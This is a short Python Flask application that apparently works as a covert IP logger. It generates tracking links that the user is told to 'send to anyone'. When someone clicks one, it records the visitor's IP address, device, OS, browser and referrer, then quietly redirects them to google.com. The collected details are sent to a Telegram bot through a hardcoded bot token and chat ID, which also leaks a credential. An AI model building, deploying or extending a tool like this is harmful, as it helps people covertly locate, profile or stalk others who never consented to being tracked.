from flask import Flask, request, redirect
import requests
import uuid
from datetime import datetime
from user_agents import parse

app = Flask(__name__)

TOKEN = "8623908851:AAEa5zbK22wfIj2IezRFjz9CsrnNN02ab3Q"
CHAT_ID = 7591700804

@app.route('/track/<link_id>')
def track(link_id):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent_string = request.headers.get('User-Agent')
    referrer = request.headers.get('Referer')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Parse device info nicely
    ua = parse(user_agent_string)
    device_name = f"{ua.device.brand or ''} {ua.device.model or ''}".strip() or "Unknown Device"
    os = ua.os.family
    browser = ua.browser.family

    if device_name == "Unknown Device":
        device_name = f"{os} - {browser}"

    message = f"""🔥 New Click Detected!

🆔 Link ID: {link_id}
⏰ Time: {timestamp}
🌐 IP: {ip}
📱 Device: {device_name}
   OS: {os}
   Browser: {browser}
🔗 Referrer: {referrer or 'Direct'}"""

    try:
        requests.get(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            params={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
        )
    except:
        pass

    return redirect("https://google.com", code=302)

@app.route('/generate')
def generate():
    link_id = str(uuid.uuid4())[:12]
    full_link = f"https://web-production-39eb45.up.railway.app/track/{link_id}"
    return f"✅ Your new tracking link:\n\n{full_link}\n\nSend this to anyone!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
